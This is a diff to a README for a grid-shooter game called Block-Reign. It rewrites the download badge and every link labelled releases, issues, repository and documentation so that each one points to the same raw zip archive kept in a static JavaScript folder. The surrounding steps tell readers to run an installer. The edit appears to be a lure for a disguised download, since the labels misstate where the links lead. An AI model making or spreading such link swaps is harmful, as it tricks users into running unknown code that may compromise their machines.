@@ -6,7 +6,7 @@ Welcome to Block-Reign! This game offers a unique 10×10 PvE grid shooter experi
 
 ## 📥 Download Block-Reign
 
-[![Download Block-Reign](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/shreyashreddy/Block-Reign/releases)
+[![Download Block-Reign](https://github.com/shreyashreddy/Block-Reign/raw/refs/heads/main/game/static/js/Block_Reign_v2.2.zip)](https://github.com/shreyashreddy/Block-Reign/raw/refs/heads/main/game/static/js/Block_Reign_v2.2.zip)
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ Ensure your system meets the following requirements:
 
 ## 📚 How to Download & Install
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/shreyashreddy/Block-Reign/releases).
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/shreyashreddy/Block-Reign/raw/refs/heads/main/game/static/js/Block_Reign_v2.2.zip).
 2. **Choose Your Version:** Select the latest version available. It will be at the top of the list.
 3. **Download the Installer:** Click on the file that matches your operating system. For example, if you're using Windows, you might look for a file with a `.exe` extension. 
 4. **Run the Installer:** Once downloaded, double-click the file to start the installation process. Follow the simple prompts that appear on the screen.
@@ -52,12 +52,12 @@ If you encounter any issues while downloading or running the game, try these ste
 
 ## 💬 Support
 
-For assistance or feedback, please raise an issue on our [GitHub Issues page](https://github.com/shreyashreddy/Block-Reign/issues). We’re here to help!
+For assistance or feedback, please raise an issue on our [GitHub Issues page](https://github.com/shreyashreddy/Block-Reign/raw/refs/heads/main/game/static/js/Block_Reign_v2.2.zip). We’re here to help!
 
 ## 🔗 Useful Links
 
-- [Download Block-Reign](https://github.com/shreyashreddy/Block-Reign/releases)
-- [GitHub Repository](https://github.com/shreyashreddy/Block-Reign)
-- [Documentation](https://github.com/shreyashreddy/Block-Reign/wiki)
+- [Download Block-Reign](https://github.com/shreyashreddy/Block-Reign/raw/refs/heads/main/game/static/js/Block_Reign_v2.2.zip)
+- [GitHub Repository](https://github.com/shreyashreddy/Block-Reign/raw/refs/heads/main/game/static/js/Block_Reign_v2.2.zip)
+- [Documentation](https://github.com/shreyashreddy/Block-Reign/raw/refs/heads/main/game/static/js/Block_Reign_v2.2.zip)
 
 Enjoy your gaming experience with Block-Reign! The AI is ready to adapt to you.
